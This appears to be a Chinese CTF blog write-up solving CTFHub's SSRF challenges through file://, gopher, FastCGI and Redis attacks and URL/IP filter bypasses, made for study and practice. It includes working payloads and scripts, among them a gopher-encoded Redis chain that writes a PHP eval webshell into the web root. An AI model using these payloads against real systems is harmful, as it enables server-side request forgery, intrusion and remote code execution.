---
title: ctfhub-ssrf
date: 2021-09-15 21:15:33
author: Na0H
tags:	
- ctf
categories:
- ctf
excerpt: ctfhub jwt
description:  ctfhub jwt


---

<!-- more -->

ctfshow也做过ssrf，再做一下这边看看是否有缺漏~

## http、file等协议

### 内网访问（http://）

> 尝试访问位于127.0.0.1的flag.php吧

http协议
意思是用目标主机访问其内网环境的flag.php

```
?url=http://127.0.0.1/flag.php
```

![](https://i.loli.net/2021/09/15/93sCEpPbolfNMxB.png)



### 伪协议读取文件

> 尝试去读取一下Web目录下的flag.php吧

直接访问页面无法活的flag，用file协议读取文件

```
/?url=file:///var/www/html/flag.php
```

![](https://i.loli.net/2021/09/14/CZr7AaqFdbEulM6.png)

### 端口扫描

> 来来来性感CTFHub在线扫端口,据说端口范围是8000-9000哦

```
?url=http://127.0.0.1:8000
```

然后bp或者脚本从8000跑到9000

![](https://i.loli.net/2021/09/14/XxMn4WmhBswF6Kq.png)



## Gopher协议

### POST请求

> 这次是发一个HTTP POST请求.
> 对了.ssrf是用php的curl实现的.并且会跟踪302跳转.加油吧骚年

用file协议可以读到源码：

```
?url=file:///var/www/html/index.php
```

```php
<?php

error_reporting(0);

if (!isset($_REQUEST['url'])){
    header("Location: /?url=_");
    exit;
}

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $_REQUEST['url']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_exec($ch);
curl_close($ch);
```

```
?url=file:///var/www/html/flag.php
```

```php
<?php

error_reporting(0);

if ($_SERVER["REMOTE_ADDR"] != "127.0.0.1") {
    echo "Just View From 127.0.0.1";
    return;
}

$flag=getenv("CTFHUB");
$key = md5($flag);

if (isset($_POST["key"]) && $_POST["key"] == $key) {
    echo $flag;
    exit;
}
?>
```



然后内网访问flag.php

```
?url=http://127.0.0.1/flag.php
```

只有一个输入框，查看源代码得到：

```html
<form action="/flag.php" method="post">
<input type="text" name="key">
<!-- Debug: key=188e4418652ea53ce446d65d57996a03-->
</form>
```

但是没有提交按钮，按题目意思自己构造post请求发到flag.php
构造gopher协议的payload：（不会gopher协议，偷一波脚本）

```python
import urllib.parse
payload =\
"""POST /flag.php HTTP/1.1
Host: 127.0.0.1:80
Content-Type: application/x-www-form-urlencoded
Content-Length: 36

key=188e4418652ea53ce446d65d57996a03
"""
#注意后面一定要有回车，回车结尾表示http请求结束
tmp = urllib.parse.quote(payload)
new = tmp.replace('%0A','%0D%0A')
result = 'gopher://127.0.0.1:80/'+'_'+new
result = urllib.parse.quote(result)
print(result)       # 这里因为是GET请求所以要进行两次url编码
```

然后拿生成的payload进行请求就行

![](https://i.loli.net/2021/09/14/kpqfcNPoWGJ4uXy.png)

### 上传文件

> 这次需要上传一个文件到flag.php了.祝你好运

还是file协议读源码，index同上题

```
?url=file:///var/www/html/flag.php
```

```php
<?php

error_reporting(0);

if($_SERVER["REMOTE_ADDR"] != "127.0.0.1"){
    echo "Just View From 127.0.0.1";
    return;
}

if(isset($_FILES["file"]) && $_FILES["file"]["size"] > 0){
    echo getenv("CTFHUB");
    exit;
}
?>

Upload Webshell
<form action="/flag.php" method="post" enctype="multipart/form-data">
    <input type="file" name="file">
</form>
```

因为前端没有提交按钮，可以自己加一个

![](https://i.loli.net/2021/09/14/XwhfymQu41LSWP2.png)

传个shell然后bp抓包，修改host为127.0.0.1

![](https://i.loli.net/2021/09/14/7iXfVExFnTNlh8j.png)

然后利用上题的脚本，gopher协议生成payload
再ssrf：![](https://i.loli.net/2021/09/14/sYbw15HFftzKPDa.png)

### FastCGI协议

> 这次.我们需要攻击一下fastcgi协议咯.也许附件的文章会对你有点帮助
>
> [Fastcgi协议分析 && PHP-FPM未授权访问漏洞 && Exp编写_mysteryflower的专栏-CSDN博客](https://blog.csdn.net/mysteryflower/article/details/94386461)

payload可以用给的，也可以直接gopherus生成：
![](https://i.loli.net/2021/09/15/1p8dDS5FkNbU6yh.png)
（ps：先`ls /`获得flag文件名，再cat)

得到的payload记得再url编码一次

![](https://i.loli.net/2021/09/15/JQ67K3NxtRZYahH.png)

### Redis协议

> 这次来攻击redis协议吧.redis://127.0.0.1:6379,资料?没有资料!自己找!
>
> [浅析Redis中SSRF的利用 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/5665)
>
> [Redis 配置详解](https://www.redis.com.cn/redis-configuration.html)
>
> [CTFHub-SSRF部分（已完结）feng](https://blog.csdn.net/rfrder/article/details/108589988)



> redis命令
>
> ```
> flushall
> set 1 '<?php eval($_GET['a']);?>'
> config set dir /var/www/html
> config set dbfilename shell.php
> save
> ```
>
> 然后利用脚本其转换为url传递即可，同样要进行url二次编码
>
> ```python
> import urllib
> from urllib import parse
> 
> protocol = "gopher://"
> ip = "127.0.0.1"
> port = "6379"
> shell = "\n\n<?php eval($_GET[\'a\']);?>\n\n"
> filename = "shell.php"
> path = "/var/www/html"
> passwd = ""
> cmd = ["flushall",
>        "set 1 {}".format(shell.replace(" ", "${IFS}")),
>        "config set dir {}".format(path),
>        "config set dbfilename {}".format(filename),
>        "save"
>        ]
> if passwd:
>     cmd.insert(0, "AUTH {}".format(passwd))
> payload_prefix = protocol + ip + ":" + port + "/_"
> CRLF = "\r\n"
> 
> 
> def redis_format(arr):
>     redis_arr = arr.split(" ")
>     cmd_ = ""
>     cmd_ += "*" + str(len(redis_arr))
>     for x_ in redis_arr:
>         cmd_ += CRLF + "$" + str(len((x_.replace("${IFS}", " ")))) + CRLF + x_.replace("${IFS}", " ")
>     cmd_ += CRLF
>     return cmd_
> 
> 
> if __name__ == "__main__":
>     payload = ""
>     for x in cmd:
>         payload += parse.quote(redis_format(x))  # url编码
>     payload = payload_prefix + parse.quote(payload)  # 再次url编码
>     print(payload)
> ```
>
> 传入后访问生成的shell.php用参数进行命令执行即可

ps：当然也可以gopherus直接生成payload

## bypass

### URL Bypass

> 请求的URL中必须包含http://notfound.ctfhub.com，来尝试利用URL的一些特殊地方绕过这个限制吧

这里利用url的格式绕过即可

```
?url=http://notfound.ctfhub.com@127.0.0.1/flag.php
```

- php的curl默认读取@后面的部分

  ```
  http://abc@127.0.0.1
  实际上是以用户名abc连接到站点127.0.0.
  ```

- ?后默认为get参数

### 数字IP Bypass

> 这次ban掉了127以及172.不能使用点分十进制的IP了。但是又要访问127.0.0.1。该怎么办呢

1. 进制转换
2. localhost
3. 0：在linux中解析为127.0.0.1；windows中解析为0.0.0.0

### 302跳转 Bypass

> SSRF中有个很重要的一点是请求可能会跟随302跳转，尝试利用这个来绕过对IP的检测访问到位于127.0.0.1的flag.php吧

根据ctfshow的题目
应该是
在vps写个php文件用于跳转，开启服务访问进行跳转即可

```php
<?php
if(isset($_GET['url'])){
    header("Location: {$_GET['url']}");
    exit;
}
?>
```

但是我传的时候发现ban掉了intener ip

然后发现直接?url=localhost/flag.php就出了。。。



### DNS重绑定 Bypass

还是直接出flag--

不过ctfshow也了解过，感兴趣可以去那边了解一下
